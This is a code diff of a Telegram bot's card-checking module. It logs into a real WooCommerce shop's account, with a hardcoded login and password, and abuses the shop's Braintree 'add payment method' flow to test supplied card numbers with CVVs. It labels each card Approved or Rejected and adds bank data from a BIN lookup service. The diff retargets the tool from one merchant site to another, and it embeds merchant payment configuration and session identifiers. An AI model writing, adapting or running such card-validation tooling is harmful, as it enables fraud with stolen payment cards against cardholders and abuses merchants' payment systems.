@@ -1,6 +1,11 @@
 import requests
 import base64
 import json
+
+
+import requests
+import base64
+import json
 import requests
 from pyrogram import Client, filters
 from pyrogram.types import Message
@@ -14,52 +19,12 @@ from helpers.User_Control import user_check
 requests.packages.urllib3.disable_warnings()
 
 
-def id_session():
-    uuid_session = str(uuid.uuid4())
-    return uuid_session
-
-
-def generate_custom_id():
-    base_uuid = str(uuid.uuid4())
-    custom_id = f"0_{base_uuid[:8]}-{base_uuid[9:13]}-{base_uuid[14:18]}-{base_uuid[19:23]}-{base_uuid[24:]}"
-    return custom_id
-
-
-def base64_url_to_base64(base64_url):
-    # Replace URL-safe characters with standard Base64 characters
-    base64_standard = base64_url.replace("-", "+").replace("_", "/")
-
-    # Add padding if needed
-    padding = len(base64_standard) % 4
-    if padding:
-        base64_standard += "=" * (4 - padding)
-
-    base64_code = base64.b64decode(base64_standard)
-
-    return base64_code
-
-
-def email_braintree():
-    email = (
-        "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        + "@gmail.com"
-    )
-    return email
-
-
-def get_name_rand():
-    first = "".join(random.choices(string.ascii_lowercase, k=5))
-    second = "".join(random.choices(string.ascii_lowercase, k=5))
-
-    return first, second
-
-
-@Client.on_message(filters.command("bb"))
-async def check_braintree_new_card(bot: Client, cmd: Message):
+@Client.on_message(filters.command("cc"))
+async def sihad_check_braintree_new_card(bot: Client, cmd: Message):
     if not await user_check(bot, cmd):
         return
     status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")
-    
+
     # Check if the command is a reply to a message with a text/plain document
     if (
         cmd.reply_to_message
@@ -106,7 +71,7 @@ async def check_braintree_new_card(bot: Client, cmd: Message):
             os.remove(cards_path)
     elif cmd.text:
         try:
-            data = cmd.text.split("/bb", 1)[1].strip().split("|")
+            data = cmd.text.split("/cc", 1)[1].strip().split("|")
             if len(data) < 4:
                 raise IndexError("Not enough data provided")
 
@@ -141,14 +106,15 @@ async def check_braintree_new_card(bot: Client, cmd: Message):
 
 class BraintreeAuth:
     def __init__(self):
-        self.Site_Api = "https://ironsidecomputers.com/my-account/"
-        self.Config_Api = "https://ironsidecomputers.com/my-account/add-payment-method/"
+        self.Site_Api = "https://www.mockofun.com/my-account/add-payment-method/"
+        self.Config_Api = "https://www.mockofun.com/wp-admin/admin-ajax.php"
         self.GraphQL_Api = "https://payments.braintree-api.com/graphql"
+        self.login_api = "https://www.mockofun.com/register/"
         self.session = requests.Session()
 
     def _post_request_site(self):
         headers = {
-            "Host": "ironsidecomputers.com",
+            "Host": "www.mockofun.com",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
@@ -158,20 +124,47 @@ class BraintreeAuth:
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Site": "none",
             "Sec-Fetch-User": "?1",
-            "If-Modified-Since": "Mon, 06 Jan 2025 16:47:17 GMT",
             "Priority": "u=0, i",
             "Te": "trailers",
             "Connection": "keep-alive",
         }
+
+        response1 = self.session.get(self.login_api, headers=headers)
+        # print(response1.text)
+        security = self.extract_value(
+            response1.text,
+            '<input type="hidden" id="security" name="security" value="',
+            " />",
+        )
+
         headers1 = {
-            "Host": "ironsidecomputers.com",
+            "Host": "www.mockofun.com",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://www.mockofun.com",
+            "Referer": "https://www.mockofun.com/register/",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "Priority": "u=0",
+            "Te": "trailers",
+        }
+
+        playload = f"action=ajaxlogin&username=antorsir1718%40gmail.com&password=antorsir1718%40gmail.com&security={security}"
+
+        response = self.session.post(self.Config_Api, headers=headers1, data=playload)
+        print(response.text)
+        headers = {
+            "Host": "www.mockofun.com",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
             "Accept-Encoding": "gzip, deflate, br",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://ironsidecomputers.com",
-            "Referer": "https://ironsidecomputers.com/my-account/",
+            "Referer": "https://www.mockofun.com/my-account/add-payment-method/",
             "Upgrade-Insecure-Requests": "1",
             "Sec-Fetch-Dest": "document",
             "Sec-Fetch-Mode": "navigate",
@@ -180,33 +173,50 @@ class BraintreeAuth:
             "Priority": "u=0, i",
             "Te": "trailers",
         }
-        response = self.session.post(self.Site_Api, headers=headers)
-        nonce = self.extract_value(
-            response.text,
-            '<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="',
-            '" />',
-        )
+        response1 = self.session.get(self.Site_Api, headers=headers)
+        with open("test.html", "w", encoding="utf-8") as f:
+            f.write(response1.text)
 
-        Config_payload = f"username=antorsir1718%40gmail.com&password=c%23-%7DVct4d*.j%2CUm&woocommerce-login-nonce={nonce}&_wp_http_referer=%2Fmy-account%2F&login=Login"
+        payment_nonce = self.extract_value(
+            response1.text,
+            "name=woocommerce-add-payment-method-nonce value=",
+            ">",
+        )
+        config_nonce = self.extract_value(
+            response1.text, '"client_token_nonce":"', '",'
+        )
+        print(payment_nonce)
+        print(config_nonce)
+
+        Config_payload = (
+            f"action=wc_braintree_credit_card_get_client_token&nonce={config_nonce}"
+        )
+        headers = {
+            "Host": "www.mockofun.com",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Content-Length": "65",
+            "Origin": "https://www.mockofun.com",
+            "Referer": "https://www.mockofun.com/my-account/add-payment-method/",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "Te": "trailers",
+        }
 
         Config_Rq = self.session.post(
-            self.Site_Api, headers=headers1, data=Config_payload
+            self.Config_Api, headers=headers, data=Config_payload
         )
 
-        wc_request = self.session.get(self.Config_Api, headers=headers)
-
-        wc_token = self.extract_value(
-            wc_request.text, 'wc_braintree_client_token = ["', '"]'
-        )
-        nonce1 = self.extract_value(
-            wc_request.text,
-            'name="woocommerce-add-payment-method-nonce" value="',
-            '" />',
-        )
-        base64_bytes = json.loads(base64.b64decode(wc_token))
-        # print(base64_bytes)
+        json_data = Config_Rq.json()["data"]
+        base64_bytes = json.loads(base64.b64decode(json_data))
         fingerprint = base64_bytes["authorizationFingerprint"]
-        return fingerprint, nonce1
+        print(fingerprint)
+        return fingerprint, payment_nonce
 
     @run_sync_in_thread_running_loop
     def _Post_GraphQL_Api(self, card_number, exp_month, exp_year, cvv, bot, cmd):
@@ -230,7 +240,7 @@ class BraintreeAuth:
             "clientSdkMetadata": {
                 "source": "client",
                 "integration": "custom",
-                "sessionId": "dd72d4e3-f2f0-480c-832a-50573f5d647e",
+                "sessionId": "5fe0266b-ca50-47e8-b86d-c35e7f767e13",
             },
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
             "variables": {
@@ -240,10 +250,6 @@ class BraintreeAuth:
                         "expirationMonth": f"{exp_month}",
                         "expirationYear": f"{exp_year}",
                         "cvv": f"{cvv}",
-                        "billingAddress": {
-                            "postalCode": "10001",
-                            "streetAddress": "14th street",
-                        },
                     },
                     "options": {"validate": False},
                 }
@@ -262,14 +268,15 @@ class BraintreeAuth:
             return None
         else:
             headers1 = {
-                "Host": "ironsidecomputers.com",
+                "Host": "www.mockofun.com",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "Accept-Encoding": "gzip, deflate, br",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Origin": "https://ironsidecomputers.com",
-                "Referer": "https://ironsidecomputers.com/my-account/add-payment-method/",
+                "Content-Length": "895",
+                "Origin": "https://www.mockofun.com",
+                "Referer": "https://www.mockofun.com/my-account/add-payment-method/",
                 "Upgrade-Insecure-Requests": "1",
                 "Sec-Fetch-Dest": "document",
                 "Sec-Fetch-Mode": "navigate",
@@ -278,54 +285,72 @@ class BraintreeAuth:
                 "Priority": "u=0, i",
                 "Te": "trailers",
             }
-            playload1 = f"payment_method=braintree_cc&braintree_cc_nonce_key={card_token}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F2np5c2vx3j8nk63b%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F2np5c2vx3j8nk63b%22%7D%2C%22merchantId%22%3A%222np5c2vx3j8nk63b%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Discover%22%2C%22JCB%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Ironside+Computers%22%2C%22clientId%22%3A%22Afi8VAfAmDYSZSXKXBkQUMjQA0IWiZ4yBaL-MM4xm7zOsMHpDLw_FEeFpHihZVv3TC8AWMSj6JJ-EIVo%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22IronsideComputersInc_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce={nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"
-            payment = self.session.post(
-                self.Config_Api, headers=headers1, data=playload1
-            )
-            req = requests.get(
-                f"https://bins.antipublic.cc/bins/{card_number[:6]}", verify=True
-            )
-            requ = req.json()
-            error_msg = self.extract_value(
-                payment.text, '<ul class="woocommerce-error" role="alert">', "</div>"
-            )
-            msg = "Invalid postal code "
-            if error_msg and (msg in error_msg):
-                message_text = f"""
+            playload1 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={card_token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%223cd52f1ac1a7c57607de4f9433be5e52%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%223cd52f1ac1a7c57607de4f9433be5e52%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"
+            payment = self.session.post(self.Site_Api, headers=headers1, data=playload1)
+            # print(payment.text)
+
+            try:
+                # Error & Success message extract
+                error_message = self.extract_value(
+                    payment.text, "class=woocommerce-error role=alert>", "</ul>"
+                )
+                success_message = self.extract_value(
+                    payment.text, "class=woocommerce-message role=alert>", "</div>"
+                )
+
+                # BIN API Request
+                req = requests.get(
+                    f"https://bins.antipublic.cc/bins/{card_number[:6]}", verify=True
+                )
+                requ = req.json()
+
+                # Fallback values in case of missing keys
+                country = requ.get("country", "Unknown")
+                country_flag = requ.get("country_flag", "🏳")
+                country_name = requ.get("country_name", "Unknown")
+                brand = requ.get("brand", "Unknown")
+                card_type = requ.get("type", "Unknown")
+                card_level = requ.get("level", "Unknown")
+                bank = requ.get("bank", "Unknown")
+
+                # Success Condition
+                msg = "New payment method added"
+                if success_message and msg in success_message:
+                    message_text = f"""
 <b>⎚ Approved ✅</b>
 𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
 <b>Status ⇾ Approved </b>
 
 <b>BIN ⇾</b> <code>{card_number[:6]}</code>
-<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
-<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
-<b>Bank ⇾</b> {requ['bank']}
+<b>Country ⇾</b> {country} | {country_flag} | {country_name}
+<b>Data ⇾</b> {brand} - {card_type} - {card_level}
+<b>Bank ⇾</b> {bank}
 <b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
 """
-                cmd.reply_text(message_text)
-                print(error_msg)
-            else:
-                match = re.search(r"Reason:\s*(.+)", error_msg)
-                print(match)
-                print(error_msg)
-                if match:
-                    reason = match.group(1).strip()
-                message_text = f"""
+                    cmd.reply_text(message_text)
+                    print(success_message)
+
+                # Failure Condition
+                elif error_message:
+                    message_text = f"""
 <b>⎚ Rejected ❌</b>
 𝗖𝗮𝗿𝗱 ⇾ <code>{card_number}|{exp_month}|{exp_year}|{cvv}</code>
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Auth
-<b>Status ⇾ {reason if reason else "Unknow Decliend"}</b>
+<b>Status ⇾ Declined</b>
 
 <b>BIN ⇾</b> <code>{card_number[:6]}</code>
-<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
-<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
-<b>Bank ⇾</b> {requ['bank']}
-<b>Response Time ⇾</b> <code>2.{random.randint(0, 9)} seconds</code>
+<b>Country ⇾</b> {country} | {country_flag} | {country_name}
+<b>Data ⇾</b> {brand} - {card_type} - {card_level}
+<b>Bank ⇾</b> {bank}
+<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
 """
-                cmd.reply_text(message_text)
-                print(error_msg)
-            time.sleep(19)
+                    cmd.reply_text(message_text)
+
+            except requests.exceptions.RequestException as e:
+                print(f"Request Error: {e}")
+            except Exception as e:
+                print(f"Unexpected Error: {e}")
 
     @staticmethod
     def extract_value(source, left, right):
